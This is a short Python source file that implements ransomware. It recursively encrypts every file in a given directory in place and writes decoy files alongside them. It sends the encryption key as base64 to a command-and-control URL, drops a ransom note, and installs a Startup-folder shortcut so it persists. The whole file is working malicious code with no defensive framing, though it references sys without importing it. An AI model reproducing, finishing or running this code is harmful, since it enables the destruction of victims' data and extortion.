import os
import base64
from cryptography.fernet import Fernet
import requests
import json
import winreg as reg
import win32com.client

def encrypt_file(file_path: str, key: bytes) -> None:
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

def create_decoy_file(file_path: str) -> None:
    with open(file_path, 'w') as file:
        file.write("This is a decoy file. Do not delete.")

def send_key_to_c2(key: bytes, c2_url: str) -> None:
    data = {'key': base64.b64encode(key).decode('utf-8')}
    headers = {'Content-Type': 'application/json'}
    requests.post(c2_url, data=json.dumps(data), headers=headers)

def create_ransom_note(note: str, directory: str) -> None:
    with open(os.path.join(directory, 'RANSOM_NOTE.txt'), 'w') as file:
        file.write(note)

def ensure_persistence() -> None:
    shell = win32com.client.Dispatch("WScript.Shell")
    startup_folder = shell.SpecialFolders("Startup")
    shortcut_path = os.path.join(startup_folder, "ransomware.lnk")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = sys.argv[0]
    shortcut.Save()

def ransomware_with_file_decoy_and_tracking(directory: str, note: str, c2_url: str) -> None:
    key = Fernet.generate_key()
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
            create_decoy_file(file_path + '.decoy')
    send_key_to_c2(key, c2_url)
    create_ransom_note(note, directory)
    ensure_persistence()
